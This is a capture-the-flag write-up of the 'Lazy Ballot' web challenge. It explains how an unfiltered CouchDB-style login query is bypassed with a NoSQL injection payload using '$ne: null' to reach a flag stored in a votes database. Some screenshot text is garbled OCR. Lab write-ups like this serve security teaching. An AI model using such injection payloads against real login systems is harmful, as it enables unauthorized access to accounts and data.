# Lazy Ballot
> As a Zenium State hacker, your mission is to breach Arodor's secure election system, subtly manipulating the results to create political chaos and destabilize their government, ultimately giving Zenium State an advantage in the global power struggle.

## About the Challenge
We were given a source code (You can download the source code [here](web_lazy_ballot.zip)) and also we got a website to test. Here is the preview of the website


[Image extracted text: ArOdOr ElectiONS
HOme
Blog
0 Voting PlatfOrm
View ReSUlts
1.8 Billion Votes Collected
ReSults &re CUrcently DeiNg PrOCeSSed aNd will De MadE AvaiLaDle ON this PLALFONMN]


And also there is a login page


[Image extracted text: Login
USerNANE
PaSSWOrd
SUbmit]


The flag was located in the database, especially in the `votes` database and we need to login first to obtain the flag


[Image extracted text: for (let i = 0; i <=
voteCount;
i++)
const region
this.regions[Math
floor (Math
random
this
regions.length) ];
const
party
this
parties[Math.floor (Math
random
this-parties-length) ];
const
vote
region"
voteCount
this
region,
party"
party,
"verified"
voteCount
false
true
this.votesdb.insert(vote, i);
flag]


## How to Solve?
If you check this code in `database.js` file

```js
async loginUser(username, password) {
    const options = {
        selector: {
            username: username,
            password: password,
        },
    };

    const resp = await this.userdb.find(options);
    if (resp.docs.length) return true;

    return false;
    }
```

As you can see there is no filter in the code so we can bypass it using this payload

```
{"username": {"$ne": null}, "password": {"$ne": null} }
```


[Image extracted text: Request
Response
Pretty
Raw
Hex
Pretty
Raw
Hex
Render
POST
[api/login
HTTP/1 - 1
HTTP/1-1
200
Host
94.237
149:52648
X-Povered-BY:
Express
User-
Agent
Hozilla/5
(Vindous
IT
Vine4 ;
264;
17:109
Cont ent -
Type
applicat
on/Json;
charsetsut f-8
Geclo/ZO100101
Firefox/115 _
Content-Length:
Accept
ETag:
Za-/VPOES-EBCIUsOBlY9syo+ZDc?"
1ecept
Language
Ea
US
en ; 4-0_
Dace
Hon
Jul
2023 03:55:2=
GHT
Accept-Encoding:
szip ,
deflace
Connect_
on -
close
Referer:
http: / /94_
237
55.149: 52648/login
Content
Type
applicat
on/ Json
Concent
Lengch:
resp
"User
auchenticated
success fully
Origin:
http: / /94
237.
149: 52648
Connect
on :
close
Coolie:
connect
sid=
5t34ghBul:YBppL 4HKLH?
dBWIliEgEud3X-Y- oVIJZbSva: BiEFVAHeNIFTOPJ7F
ffS]PH9gZt swVaHR8
usernane
Sne
nul
assvord
{ne
nul]


And then find the flag in the voting list


[Image extracted text: @ Votes
Party
Region
Verified
FCOD164ACOFDSDZZBD4 DZFS6EDS9DSE
Order Of CONtCOl AlliaNCE
HTBICOrrupt:d_cQuch_bAlDt}
FalSE
2
3
4
5
6
10]


```
HTB{c0rrupt3d_c0uch_b4ll0t}
```